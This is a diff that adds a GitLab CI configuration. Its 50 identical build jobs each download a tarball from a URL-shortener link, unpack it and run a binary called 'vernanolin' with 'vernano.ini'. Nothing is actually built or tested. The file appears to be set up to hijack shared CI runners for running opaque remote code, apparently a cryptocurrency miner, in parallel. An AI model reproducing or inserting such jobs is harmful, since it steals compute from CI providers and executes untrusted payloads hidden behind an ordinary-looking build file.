@@ -1,0 +1,259 @@
+image: golang:latest
+
+variables:
+  REPO_NAME: gitlab.com/namespace/project
+
+stages:
+  - build
+  - test
+  - deploy
+
+build_1:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_2:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_3:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_4:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_5:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_6:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_7:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_8:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_9:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_10:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_11:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_12:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_13:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_14:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_15:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_16:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_17:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_18:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_19:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_20:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_21:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_22:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_23:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_24:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_25:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+    
+build_26:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_27:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_28:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_29:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_30:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_31:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_32:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_33:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_34:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_35:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_36:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_37:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_38:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_39:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_40:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_41:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_42:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_43:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_44:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_45:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_46:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_47:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_48:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_49:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
+
+build_50:
+  stage: build
+  script:
+    - wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
